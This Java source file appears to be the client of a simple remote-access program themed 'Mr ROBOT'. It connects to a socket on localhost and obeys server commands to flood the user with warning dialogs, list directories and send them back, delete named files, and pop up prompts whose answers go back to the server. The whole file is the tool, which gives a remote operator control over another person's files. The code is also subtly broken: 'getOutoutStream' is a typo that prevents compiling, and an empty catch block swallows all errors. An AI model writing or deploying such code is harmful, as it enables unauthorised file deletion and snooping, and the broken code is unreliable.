import java.net.Socket;
import javax.swing.JOptionPane;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;

class MessageReceiver extends Thread {
    DataInputStream dis;
    DataOutputStream dos;
    String message;
    String receivedMessage;
    File file;
    String currentDirectory;
    String allList;

    public void run() {
        try{
            dis = new DataInputStream(Client.socket.getInputStream());
            dos = new DataOutputStream(Client.socket.getOutoutStream());
            currentDirectory="/";
            while(true) {
                receivedMessage = dis.readUTF();
                if(receivedMessage.equals("spam()")) {
                    for(int i=0; i<20; i++) {
                        JOptionPane.showMessageDialog(null, receivedMessage, "Mr ROBOT", JOptionPane.WARNING_MESSAGE);
                    }
                }
                else if(receivedMessage.equals("fileListing()")){
                    file = new File(currentDirectory);
                    String list[] = file.list();
                    allList = "";
                    for(String s: list) {
                        allList += s+"\t";
                    }
                    dos.writeUTF("\n\n");
                    dos.writeUTF(allList);
                }
                else if(receivedMessage.equals("changeDir()")) {
                    receivedMessage = dis.readUTF();
                    if(receivedMessage.equals("/")) {
                        currentDirectory = "/";
                    }
                    else {
                        currentDirectory += receivedMessage+"/";
                        file = new File(currentDirectory);
                        if(file.exists()){
                            dos.writeUTF("Directory changed");
                        }
                        else {
                            dos.writeUTF("Directory doesn't exists");
                        }
                    }
                }
                else if(receivedMessage.equals("remove()")) {
                    receivedMessage = dis.readUTF();
                    System.out.println(receivedMessage);
                    file = new File(currentDirectory+receivedMessage);
                    if(file.exists()){
                        file.delete();
                        dos.writeUTF("File deleted");
                    }
                }
                else if(receivedMessage.equals("sendMsg()")) {
                    receivedMessage = dis.readUTF();
                    message = JOptionPane.showInputDialog(null, receivedMessage, "Mr ROBOT", JOptionPane.INFORMATION_MESSAGE);
                    dos.writeUTF(message);
                }
            }
        }
        catch(Exception e){
        }
    }
}

class Client{
    public static Socket socket;
    public Client() throws Exception{
        socket = new Socket("localhost", 3456);
        MessageReceiver receiver = new MessageReceiver();
        receiver.start();
    }
}